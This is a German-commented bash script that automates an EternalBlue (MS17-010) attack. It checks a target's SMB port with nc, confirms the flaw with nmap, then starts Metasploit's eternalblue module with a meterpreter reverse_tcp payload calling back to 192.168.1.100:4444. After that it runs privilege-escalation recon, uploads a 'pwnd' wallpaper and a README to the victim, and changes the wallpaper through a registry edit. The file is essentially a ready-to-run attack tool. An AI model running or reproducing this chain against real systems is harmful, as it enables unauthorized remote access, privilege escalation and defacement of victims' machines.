#!/bin/bash

# EternalBlue Check + Exploit + PrivEsc + Persistence + Hinweis-Log

IP="$1"
AUTO="$2"
POST="$3"
PERSIST="$4"

if [ -z "$IP" ]; then
  echo "Usage: $0 <IP> [--auto-exploit] [--post-privesc] [--persistence]"; exit 1
fi

echo "[*] Prüfe SMB-Port auf $IP..."
if ! nc -z -w2 "$IP" 445 2>/dev/null; then
  echo -e "[!] Port 445 ist geschlossen – kein SMB erreichbar."; exit 1
fi

echo "[*] Prüfe auf EternalBlue mit Nmap..."
NMAP_RESULT=$(nmap -p445 --script smb-vuln-ms17-010 "$IP")

if echo "$NMAP_RESULT" | grep -q "VULNERABLE"; then
  echo -e "[+] Verwundbar: Ja"

  if [ "$AUTO" == "--auto-exploit" ]; then
    echo "[*] Starte Exploit in neuem Terminal..."
    gnome-terminal -- bash -c "
      msfconsole -q -x '
        use exploit/windows/smb/ms17_010_eternalblue;
        set RHOSTS $IP;
        set PAYLOAD windows/x64/meterpreter/reverse_tcp;
        set LHOST 192.168.1.100;
        set LPORT 4444;
        exploit -z;
        sleep 5;
        sessions -i 1 -c getuid;
        sessions -i 1 -c run post/windows/local/service_permissions;
        sessions -i 1 -c run post/multi/recon/local_exploit_suggester;
        upload /tmp/pwnd_wallpaper_alpaka.png C:\\Windows\\Temp\\alpaka_wall.png;
        execute -f RUNDLL32.EXE -a \"user32.dll,UpdatePerUserSystemParameters\";
        upload /tmp/SECURITY_README.txt C:\\Users\\Public\\Desktop\\SECURITY_README.txt;
        shell;
        reg add \"HKCU\\Control Panel\\Desktop\" /v Wallpaper /t REG_SZ /d \"C:\\Windows\\Temp\\alpaka_wall.png\" /f;
        RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters;
        exit;
      ';
      exec bash
    "
  else
    echo "[*] Exploit bereit – führe mit --auto-exploit aus."
  fi
else
  echo -e "[-] Verwundbar: Nein"
fi
